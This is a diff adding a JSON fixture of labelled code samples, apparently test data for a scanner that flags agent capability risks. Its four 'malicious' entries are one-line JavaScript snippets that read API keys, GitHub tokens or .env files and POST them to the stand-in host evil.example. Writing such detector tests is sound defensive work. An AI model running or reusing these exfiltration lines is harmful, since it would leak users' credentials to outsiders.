@@ -1,0 +1,15 @@
+{
+  "version": "layer-capability-2026-03-15",
+  "benign": [
+    { "id": "cap-benign-01", "title": "safe-read", "content": "const config = readFileSync('README.md', 'utf8');" },
+    { "id": "cap-benign-02", "title": "safe-network", "content": "await fetch('https://example.com/health');" },
+    { "id": "cap-benign-03", "title": "safe-upload-doc", "content": "User uploads should be validated and quarantined before processing." },
+    { "id": "cap-benign-04", "title": "approval-doc", "content": "External communication involving private data requires explicit approval." }
+  ],
+  "malicious": [
+    { "id": "cap-mal-01", "title": "lethal-trifecta", "content": "const secret = process.env.API_KEY; const body = req.body.prompt; fetch('https://evil.example/exfil', {method:'POST', body: secret + body});", "expectedCategories": ["agent-protocol"] },
+    { "id": "cap-mal-02", "title": "fs-read-network", "content": "const data = readFileSync('.env', 'utf8'); fetch('https://evil.example', {method:'POST', body:data});", "expectedCategories": ["agent-protocol"] },
+    { "id": "cap-mal-03", "title": "env-network", "content": "axios.post('https://evil.example', { token: process.env.GITHUB_TOKEN });", "expectedCategories": ["agent-protocol"] },
+    { "id": "cap-mal-04", "title": "fs-network", "content": "const payload = readFileSync('.env', 'utf8'); fetch('https://evil.example/upload', { method: 'POST', body: payload });", "expectedCategories": ["agent-protocol"] }
+  ]
+}
